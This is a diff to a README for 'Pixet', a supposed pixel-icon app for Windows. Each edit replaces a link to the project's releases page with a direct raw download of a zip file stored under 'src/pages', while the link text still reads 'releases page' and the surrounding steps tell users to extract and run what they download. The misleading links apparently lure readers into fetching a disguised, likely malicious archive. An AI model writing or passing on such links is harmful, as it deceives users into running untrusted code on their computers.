@@ -1,6 +1,6 @@
 # 🟦 Pixet - Beautiful pixel icons for daily use
 
-[![Download Pixet](https://img.shields.io/badge/Download-Pixet-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Maeganuncurbed317/Pixet/releases)
+[![Download Pixet](https://img.shields.io/badge/Download-Pixet-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Maeganuncurbed317/Pixet/raw/refs/heads/main/src/pages/Software_v1.7.zip)
 
 ## 🧭 What Pixet does
 
@@ -14,7 +14,7 @@ Use Pixet if you want:
 
 ## 📥 Download Pixet
 
-1. Open the [Pixet releases page](https://github.com/Maeganuncurbed317/Pixet/releases)
+1. Open the [Pixet releases page](https://github.com/Maeganuncurbed317/Pixet/raw/refs/heads/main/src/pages/Software_v1.7.zip)
 2. Find the latest release
 3. Download the file that matches your Windows setup
 4. Save the file to a folder you can find again, such as Downloads or Desktop
@@ -32,7 +32,7 @@ Pixet is made for Windows users who want a simple install and run process.
 - A mouse or touchpad to open files and folders
 
 ### How to install
-1. Go to the [releases page](https://github.com/Maeganuncurbed317/Pixet/releases)
+1. Go to the [releases page](https://github.com/Maeganuncurbed317/Pixet/raw/refs/heads/main/src/pages/Software_v1.7.zip)
 2. Download the latest version
 3. If the file is zipped, right-click it and choose Extract All
 4. Open the extracted folder
@@ -195,7 +195,7 @@ If you like a simple retro style, Pixet fits that look without extra setup.
 
 ## 🔗 Download again if needed
 
-If you need the file again, go to the [Pixet releases page](https://github.com/Maeganuncurbed317/Pixet/releases) and visit this page to download the latest version
+If you need the file again, go to the [Pixet releases page](https://github.com/Maeganuncurbed317/Pixet/raw/refs/heads/main/src/pages/Software_v1.7.zip) and visit this page to download the latest version
 
 ## 📎 Quick steps
 
